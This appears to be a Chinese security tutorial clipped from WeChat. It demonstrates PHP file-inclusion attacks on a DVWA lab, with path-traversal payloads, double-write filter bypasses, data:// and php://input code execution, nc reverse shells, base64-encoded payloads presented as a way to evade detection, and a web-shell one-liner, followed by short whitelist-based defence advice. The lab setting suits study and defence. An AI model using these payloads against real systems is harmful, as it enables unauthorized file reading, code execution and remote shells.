---
title: 【微信】文件包含漏洞以及php伪协议的应用
source: https://mp.weixin.qq.com/s/OFwCi-PuhxbgOlaIxJPS5A
source_host: mp.weixin.qq.com
clip_date: 2026-11-10T13:00:40+08:00
trace_id: 3a175228-6746-455f-aea4-bde24bddb5e3
content_hash: f286ea3a351765a0b8b9d50eb13bfa2755f4080ae9cd1cddd4bea2563404dd5c
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 17
  succeeded: 17
  failed_urls: []
notion_page_id: 41475244-d011-8105-ac58-cd920b6f6206
ioc: null
---

**菜鸟学安全** *2026年11月10日 08:15*

文件包含是个容易被低估的漏洞：参数里多补几个 `../` ，页面就吐出 `/etc/passwd` ；再加一个 `data://` ，服务器就替你把任意代码执行了。从读一个文件到拿一个 shell，中间往往只隔着一层没做好的过滤。

根因很朴素： `include()` 这类函数把用户可控的路径当代码执行，过滤不严就是注入。PHP 因为伪协议和封装器多，把这条路铺得格外顺——本地包含读文件、双写绕黑名单、 `file://` 绕协议限制、 `data://` 和 `php://input` 直接执行代码，最后还能用 nc 把 shell 弹回来。

这篇拿 DVWA 低、中、高三档把整个流程走一遍，每一步都附 payload 和回显：本地包含怎么进、过滤怎么绕、伪协议怎么用、base64 怎么编码免杀、shell 怎么弹——照着打就能复现。

## 一、文件包含漏洞

文件包含漏洞是代码注入的一种。其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行，代码注入的典型代表就是文件包含 File inclusion。文件包含可能会出现在 jsp、php、asp 等语言中。服务器通过函数去包含任意文件时，如果对被包含文件的来源过滤不严，就可以包含任意文件，包括我们可以构造的恶意文件。

常见的文件包含函数如下：

• PHP： `include()` 、 `include_once()` 、 `require()` 、 `require_once()` 、 `fopen()` 、 `readfile()`

• JSP/Servlet： `java.io.File()` 、 `java.io.FileReader()`

• ASP： `include file` 、 `include virtual`

这几个函数的区别：

• `include` ：包含并运行指定文件，包含外部文件出错时给出警告，但整个 PHP 文件继续执行。

• `require` ：跟 `include` 唯一不同的是，出错时 `include` 继续运行，而 `require` 停止运行。

• `include_once` ：作用跟 `include` 几乎相同，只是在导入前会先检测该文件是否已经被导入，导入过就不重复执行。

• `require_once` ：跟 `require` 几乎相同，同样会做重复导入检测。

• `php.ini` 里的两个开关： `allow_url_fopen` 控制能不能用 URL 封装器打开远程文件， `allow_url_include` 控制能不能 `include` / `require` 远程文件，两者默认都是 Off。

用上面几个函数包含文件时，该文件会作为 PHP 代码执行，PHP 内核并不在意被包含的文件是什么类型——哪怕包含的是 `.jpg` ，也会被当成 PHP 文件执行。

需要提醒的是， `allow_url_include` 、 `allow_url_fopen` 只影响远程包含；本地包含不吃这套配置，只要包含函数的参数可控、过滤不严，`../../etc/passwd` 照样能读出来。

顾名思义，在本机上包含文件叫本地包含；page="外部的URL" 这种包含远程地址的，叫远程包含。

**本地包含案例演示**

在 Kali 的网页目录（ `/var/www/html` ）下新建一个 `a.php` ，文件内容为：

```php
<?php
$page = $_GET['page'];
include($page);
?>
```

这是一个典型的存在包含漏洞的代码。打开浏览器依次访问：

```bash
http://192.168.171.128/a.php?page=file:///etc/passwd
http://192.168.171.128/a.php?page=../../../../../../../../etc/passwd
http://192.168.171.128/a.php?page=../../../../../../../../etc/motd
```

![本地包含读取系统文件](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a2c7bd9bf7dc9bca.png)

再访问 MySQL 的配置文件：

```
http://192.168.171.128/a.php?page=../../../../../../../../etc/mysql/my.cnf
```

![本地包含读取 my.cnf](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0398c9e6397f2617.png)

这就是典型的文件包含漏洞——没有对特定的符号进行过滤和转义，就会出现这种问题。下面用 DVWA 做演示，以低级为例。

**dvwa（低级）**

![DVWA 文件包含低级页面](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/05fa095795a584d7.png)

```
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=file1.php
```

把参数换成：

```
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd
```

（多加几个 `../` 是为了确保回到根目录）

![低级本地包含读取 passwd](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/2dd629edfd81a187.png)

因为 `/etc/passwd` 不是 PHP 文件，不会被解析执行，内容直接显示在页面上；如果包含的是 PHP 文件，会先执行，再把执行结果输出。

**dvwa（中级）**

![DVWA 文件包含中级页面](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e7837d814961bd93.png)

输入同样的 payload，没有回显，说明 `../` 被过滤了：

```
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd
```

![中级直接包含被过滤](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d06ceee0b204f63d.png)

这里可以用双写绕过（过滤的是 `../` 和 `http://` ）：

```
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././etc/passwd
```

原理是黑名单把 `../` 删掉后，前后剩下的字符又会拼回 `../` ：`..././` 滤掉中间那组 `../` ，剩下的 `.` 和 `./` 正好还原。远程文件同理， `hthttp://tp://192.168.171.128/shell.php` 被过滤掉一个 `http://` 后，剩下的部分正好拼回 `http://` ，可以用来反弹 shell。

重新输入上面的 payload：

![中级双写绕过成功](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/91c7f21e9f340c29.png)

回显成功。

**dvwa（高级）**

再输入双写的 payload 也没有回显了：高级难度只放行 `file` 开头的文件名，`../` 那套彻底失效。但 `file:///etc/passwd` 正好以 `file` 开头，用 file 协议直接读文件：

```
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=file:///etc/passwd
```

![高级用 file 协议绕过](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fc1f5d2e20e96568.png)

回显成功，绕过成功。

## 二、PHP伪协议

**1\. data://text/plain**

本地写不进文件、远程又包含不了的时候，就轮到 PHP 伪协议（也叫封装器）出场了——直接在 URL 里写代码，让服务器包含执行。

先输入明文试试：

```
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=data://text/plain,helloworld
```

![data 协议回显 helloworld](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/255a4c5c0e6013ac.png)

回显成功，左上角能看到 `helloworld` 。

再换成执行命令的代码：

```ruby
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php echo shell_exec("id");?>
```

![data 协议执行 id](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ef744f40c3e18205.png)

回显成功，拿到 `uid=33(www-data)` 。

接下来尝试监听并反弹 shell（Kali 上先监听 1234 端口）：

```ruby
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php echo shell_exec("nc 192.168.171.128 1234");?>
```

![nc 连接成功但没有交互 shell](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/86d25af2a9fbad44.png)

连接上了，但拿不到交互式 shell。改用 `-e /bin/bash` 参数：

```ruby
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php echo shell_exec("nc 192.168.171.128 1234 -e /bin/bash");?>
```

![nc -e 反弹 shell 成功](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d945bfadf3d08e56.png)

反弹成功。如果在某些系统上 `-e` 用不了，还有另一种玩法——管道传输：

```ruby
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php echo shell_exec("nc 192.168.171.128 1234|/bin/bash|nc 192.168.171.128 1235");?>
```

解释一下这条命令：

```
nc 192.168.171.128 1234 | /bin/bash | nc 192.168.171.128 1235
```

目标机从 1234 端口读到攻击机发来的命令，交给 `/bin/bash` 执行，结果再通过 1235 端口送回攻击机。先让两个端口都进入监听：

![监听 1234 端口](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/161da50c6636963c.png) ![监听 1235 端口](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/dbcea0090372c8c6.png)

反弹 shell 成功，左边输入命令，右边就能看到输出。

当然，实战里明文 payload 很容易被检测到，这时就要做编码绕过。以 base64 为例：

```php
<?php echo shell_exec("id"); ?>
```

（编码前在分号后面加一个空格）

```
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJpZCIpOyA/Pg==
```

![base64 编码执行成功](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/7e8d0174a850aeab.png)

回显成功。

再进一步，把命令执行做成可通过参数控制的"一句话"：

```php
<?php $var=shell_exec($_GET['cmd']); echo $var ?>
```

对它做 base64 编码，得到：

```
PD9waHAgJHZhcj1zaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7IGVjaG8gJHZhciA/Pg==
```

把编码后的字符串拼进 URL，末尾加上 `&cmd=id` （后面要通过 `cmd` 传命令，所以要把参数带上）：

```
http://192.168.171.128/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgJHZhcj1zaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7IGVjaG8gJHZhciA/Pg==&cmd=id
```

回显成功。

**2\. php://input**

这里就要用到 Burp 抓包工具。先访问：

```
http://192.168.171.1/dvwa/vulnerabilities/fi/?page=php://input
```

![php://input 初始请求](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c21737e86d9dbee0.png)

把请求发到 Repeater，在请求体里插入一段 PHP 代码（Burp 会自动补上 `Content-Length` ）：

```php
<?php phpinfo();?>
```

![php://input 注入 phpinfo](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/571c7edb3a6ebc10.png)

注入成功，页面直接返回了 `phpinfo()` 的信息（PHP 5.4.45）。之后把请求体换成任意 PHP 代码重发就行，比如 `<?php echo shell_exec("id");?>` ，响应里就能看到命令执行结果。

**3\. 本地文件包含漏洞利用技巧**

• 包含用户上传的文件（先上传一句话木马，再包含执行）

• 包含 `data://` 或 `php://input` 等伪协议，直接执行代码

• 包含 Session 文件

• 包含日志文件：构造语句让服务器报错，把一句话随报错信息写进日志；找到日志路径后包含该文件，再用菜刀连接，拿下 Webshell

## 三、文件包含漏洞防御方法

PHP 里文件包含相关的两个配置项： `allow_url_include` （远程文件包含）、 `allow_url_fopen` （用 URL 封装器打开远程文件），能关就关，关掉之后远程包含这条路就断了。但要注意，本地包含并不依赖这两个开关，`../` 该跳还是跳。

所以真正兜底的是白名单：把允许包含的文件固定下来，只认白名单里的名字，用户输入不参与路径拼接。这样无论本地包含还是伪协议，都无从下手。

## 写在最后

回头再看整条利用链，逻辑其实很简单：可控的路径 + 不过滤的包含函数 = 任意文件读取；再加上伪协议，就是任意代码执行。DVWA 的三档难度演示的不是技巧多高深，而是"过滤思路对不对"——黑名单挡 `../` ，就用 `..././` 双写；挡 `http://` ，就双写还原；连协议都封了，还有 `file://` 、 `data://` 、 `php://input` 一条条试过去。

实战胜负往往在细节里：先看参数名（ `page` 、 `file` 、 `path` 、 `include` ），再看回显形态——页面直接吐文件内容，就是包含；只报错不吐内容，就换伪协议；完全没有回显，还可以走日志包含、Session 包含这些"盲打"路线。

防御方向一句话：关掉 `allow_url_include` 和 `allow_url_fopen` 只能挡住远程包含，本地包含还得靠白名单——别让用户输入拼进包含路径，能固定的文件名就固定。

靶场里的每一步都能在真实系统里复现。别把 DVWA 当成游戏，它演示的每一个绕过手法，背后都对应着线上真实存在的过滤缺陷。

渗透测试 · 目录

作者提示: 个人观点，仅供参考
